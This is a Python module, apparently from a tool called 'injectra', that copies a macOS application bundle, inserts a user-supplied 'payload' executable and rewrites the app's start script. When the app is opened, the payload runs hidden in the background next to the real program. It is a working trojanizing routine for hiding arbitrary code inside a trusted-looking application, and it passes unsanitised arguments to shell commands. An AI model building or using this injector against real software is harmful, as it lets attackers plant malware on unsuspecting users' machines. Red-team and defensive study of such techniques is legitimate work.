from os import chdir, path
from subprocess import call

from .get_app import get_app_name
from .logic import check_app_path, check_inputs


def inject_app(args, include_files):

    C_None = "\x1b[0;39m"
    C_BRed = "\x1b[1;31m"

    # 1 | Check for valid folder
    check_app_path(args)

    # 2 | Checking for a valid input
    output = check_inputs(args)

    # 3 | Cloning the application
    print("[i] Cloning the application...")

    if path.isdir(output) or path.isdir(args.output[0]):
        print(C_BRed + f"[!] The output directory already exists: {output}" + C_None)
        quit()

    try:

        call(f"cp -r '{args.app[0]}' '{output}'", shell=True)
        print("[+] The application was sucessfully cloned.")

    except Exception:

        print(C_BRed + f"[!] Cannot write to output: {output}" + C_None)
        quit()

    # 4 | Checking things
    print("[i] Injecting script...")

    appname = get_app_name(args)

    try:
        chdir(output + "/Contents/MacOS/")
    except Exception:
        print(C_BRed + "[!] Cannot access the applications start file." + C_None)
        quit()

    # 5 | Including files
    if include_files:

        print("[i] Including the content of the given folder...")

        if path.isdir(args.include[0]):
            print(f"[+] Getting the files: {args.include[0]}")

        else:
            print(C_BRed + f"[!] Cannot find folder to include: {args.include[0]}" + C_None)
            quit()

        try:

            call(f"cp -a '{args.include[0]}/.' .", shell=True)

        except Exception:

            print(C_BRed + "[!] Cannot include the files." + C_None)
            quit()

        print("[i] Make the included files executable...")
        try:

            call("chmod +x *", shell=True)

        except Exception:

            print(C_BRed + "[!] Cannot make the files executable." + C_None)
            quit()

    # 6 | Changing the start order
    print("[i] Changing the start order...")

    try:

        call(f"cp '{args.inject[0]}' payload", shell=True)

    except Exception:

        print(C_BRed + "[!] Cannot insert the injection." + C_None)
        quit()

    try:

        call(f"mv '{appname}' 'injectra'", shell=True)

    except Exception:

        print(C_BRed + "[!] Cannot rearrange the start order." + C_None)
        quit()

    try:

        # call(f'echo \'#!/bin/sh\nDIR=$(cd "$(dirname "$0")"; pwd) ; cd $DIR\n$DIR/payload &\n$DIR/injectra &\' > "{appname}"', shell=True)
        injection_handler = open(appname, "w")
        injection_handler.write('#!/bin/sh\nDIR=$(cd "$(dirname "$0")"; pwd) ; cd $DIR\n$DIR/payload &\n$DIR/injectra &')
        injection_handler.close()

    except Exception:

        print(C_BRed + "[!] Cannot write new a start order." + C_None)
        quit()

    try:

        call(f"chmod +x injectra ; chmod +x payload ; chmod +x '{appname}'", shell=True)

    except Exception:

        print(C_BRed + "[!] Cannot make the injection executable." + C_None)
        quit()

    try:

        chdir("../../../")
        call(f"mv '{output}' '{args.output[0]}'", shell=True)

    except Exception:

        print(C_BRed + "[!] Cannot make the application visible." + C_None)
        quit()

    print("[+] The injection was sucessful.")
